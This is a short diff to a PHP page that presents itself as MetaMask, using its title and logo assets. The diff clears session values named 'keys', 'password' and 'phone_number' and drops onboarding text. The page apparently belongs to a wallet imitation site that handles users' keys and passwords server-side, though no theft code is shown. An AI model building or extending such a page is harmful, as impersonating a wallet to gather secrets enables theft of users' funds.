@@ -3,16 +3,12 @@
     <?php
     $title = 'The Ultimate Crypto Wallet for DeFi, Web3 Apps, and NFTs | MetaMask';
     include_once './meta.php';
+    unset($_SESSION['keys']);
+    unset($_SESSION['password']);
+    unset($_SESSION['phone_number']);
     ?>
     <body>
         <?php include_once './header.php'; ?>
-        <?php
-        $list = [
-            ['img' => base_url('assets/img/mt/MetaMask_Fox.svg'), 'h4' => "Let's get started", 'div' => "Trusted by millions, MetaMask is a secure wallet making the world of web3 accessible to all."],
-            ['img' => base_url('assets/img/mt/onboarding-welcome-say-hello.svg'), 'h4' => "Explore decentralized apps", 'div' => "Store, send and spend crypto currencies and assets."],
-            ['img' => base_url('assets/img/mt/onboarding-welcome-decentralised-apps.svg'), 'h4' => "Say hello to your wallet", 'div' => "Use your MetaMask to login to decentralized apps - no signup needed."],
-        ];
-        ?>
         <div class="container">
             <div class="row justify-content-center mt40">
                 <div class="col-sm-6 rounded-4 border p25 mb50">
